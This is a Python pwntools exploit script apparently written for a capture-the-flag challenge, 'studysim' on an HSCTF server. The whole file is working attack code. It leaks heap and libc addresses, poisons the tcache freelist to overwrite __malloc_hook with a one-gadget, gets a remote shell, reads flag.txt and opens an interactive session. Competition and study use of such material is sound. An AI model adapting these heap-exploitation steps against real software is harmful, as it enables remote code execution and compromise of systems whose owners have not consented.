from pwn import *
from time import sleep

libc_stdout = 0x404020
allocated_count_addr = 0x404040
stack_addr = 0x404060

def work_do(n):
	p.sendline('do')
	p.sendline(str(n))

def work_add(s, l):
	p.sendline('add')
	p.sendline(str(l))
	p.sendline(s)

libc = ELF('./libc.so.6')
# p = process('./studysim')
p = remote('pwn.hsctf.com',5007)

# LEAK THE HEAP
print('[[ LEAK HEAP ]]')
print('[SET COUNT]')
# Make allocated_count = -4 so we can leak a heap address
work_do(4)
work_add("aaa", 4)
sleep(0.5)
p.recv(4096)
work_do(0)
sleep(0.5)
data = (''.join(chr(c) for c in p.recv(4096))).split('\n')
leak_heap = int(data[1].split(" ")[5])
heap_base = leak_heap - 0x261
print("=== HEAP BASE: {} ===".format(hex(heap_base)))
# get back to allocated_count = 0
print('[RESET COUNT]')
work_do(leak_heap)

print('[[ LEAK LIBC ]]')
# write the chunk into the 0x80 freelist as we malloc it
do_amt = (stack_addr - heap_base - 0x88) // 8
work_do(do_amt)
print('[ENTER GOT ADDRESS]')
# places our pointer in the chunk on freelist
work_add(p64(0x404010), 9)
work_do(-do_amt + 2)
# push our pointer to top of tcache freelist
work_add("EEEEFFFFGGGGHHHH",127)

sleep(0.5)
print('[RETURN GOT ADDRESS]')
p.recv(4096)
work_add("IIIIJJJJKKKKLLLL",127)
sleep(0.5)
print('[READ GOT]')
data = (''.join(chr(c) for c in p.recv(4096))).split('\n')
leak = u64(data[2].split("'")[1][16:] + '\x00\x00')

libc.address = leak - libc.sym["_IO_2_1_stdout_"] #0x1e5760
print("=== LIBC BASE : {} ===".format(hex(libc.address)))

work_do(1)

print('[[ GET SHELL ]]')
print('[POISON TCACHE]')
# write the chunk to the tcache 0x90 freelist as we malloc it
do_amt = (stack_addr - heap_base - 0x88) // 8
work_do(do_amt)
print('[ENTER HOOK]')
work_add(p64(libc.symbols["__malloc_hook"]),9) # the pointer returned by this malloc will be put on the tcache list, so it will be returned again
print('=== __malloc_hook : {} ==='.format(hex(libc.symbols["__malloc_hook"])))
# we poison the chunk by forging a pointer to the next chunk, so the tcache list is now (the last malloc) -> (our pointer)
work_do(-do_amt + 2)

# malloc the "freed" chunk. the poisoned address is now next up on the tcache list
work_add("EEEEFFFFGGGGHHHH",127)
# arbitrary write
one_gad = libc.address + 0xe2383
print('=== one_gad : {} ==='.format(hex(one_gad)))
#0x106ef8 #0xe237f#0xe2383#0xe2386#0x106ef8
# work_add(p64(one_gad),9)
print('[WRITE ONE_GAD]')
work_add(p64(one_gad), 127)
work_add('',0)
print('[GET FLAG]')
p.sendline('cat flag.txt')
flag = p.recvuntil(b'}').strip().split(b'\n')[-1]
flag = ''.join(chr(c) for c in flag)
print('=== FLAG : "{}" ==='.format(flag))

p.interactive()
